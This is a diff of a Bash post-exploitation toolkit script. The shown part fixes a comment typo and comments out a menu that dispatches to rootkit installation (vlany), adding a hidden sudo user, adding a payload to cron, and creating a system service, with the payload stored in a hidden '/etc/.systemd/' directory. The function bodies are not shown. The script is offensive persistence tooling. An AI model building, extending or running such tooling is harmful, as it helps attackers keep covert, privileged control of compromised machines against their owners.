@@ -22,7 +22,7 @@ if [ "$EUID" -ne 0 ]; then
 fi
 
 HIDDEN_DIR="/etc/.systemd/"               # Directory for binaries
-PAYLOAD_NAME="Zero"#$1                    # Name of binary to installs (preferably .elf)
+PAYLOAD_NAME="Zero"#$1                    # Name of binary to install (preferably .elf)
 PAYLOAD="${HIDDEN_DIR}${PAYLOAD_NAME}"    # Full path to payload
 
 
@@ -152,40 +152,40 @@ function add_bashrc{
 
 
 # If user enters 0 args, go ahead and install toolkit
-if [ $# -eq 0 ];then
-    echo "Unpacking toolkit.." && unpack_kit
-
-    echo "Select an option:"
-    echo "1 for rootkit installer"
-    echo "2 to add sudo user"
-    echo "3 to add payload to cron"
-    echo "4 to add system service"
-    read answer
-    if [ $answer -eq 1 ]; then
-        install_rootkit
-    elif [ $answer -eq 2 ]; then
-        add_user
-    elif [ $answer -eq 3 ]; then
-        add_cron
-    elif [ $answer -eq 4 ]; then
-        create_service
-    else
-        echo "Not a valid number. Exiting."
-        exit 1
-    fi
-
-elif [ $1 -eq "rootkit" ]; then
-    echo "Installing vlany..."
-    install_rootkit
-elif [ $1 -eq "add_user" ]; then
-    echo "Adding sudo user..."
-    add_user
-elif [ $1 -eq "add_cron" ]; then
-    "Adding payload to crontab..."
-    add_cron
-elif [ $1 -eq "add_service" ]; then
-    echo "Creating system service..."
-    create_service
-
-
-fi
+#if [ $# -eq 0 ];then
+#    echo "Unpacking toolkit.." && unpack_kit
+#
+#    echo "Select an option:"
+#    echo "1 for rootkit installer"
+#    echo "2 to add sudo user"
+#    echo "3 to add payload to cron"
+#    echo "4 to add system service"
+#    read answer
+#    if [ $answer -eq 1 ]; then
+#        install_rootkit
+#    elif [ $answer -eq 2 ]; then
+#        add_user
+#    elif [ $answer -eq 3 ]; then
+#        add_cron
+#    elif [ $answer -eq 4 ]; then
+#        create_service
+#    else
+#        echo "Not a valid number. Exiting."
+#        exit 1
+#    fi
+#
+#elif [ $1 -eq "rootkit" ]; then
+#    echo "Installing vlany..."
+#    install_rootkit
+#elif [ $1 -eq "add_user" ]; then
+#    echo "Adding sudo user..."
+#    add_user
+#elif [ $1 -eq "add_cron" ]; then
+#    "Adding payload to crontab..."
+#    add_cron
+#elif [ $1 -eq "add_service" ]; then
+#    echo "Creating system service..."
+#    create_service
+#
+#
+#fi
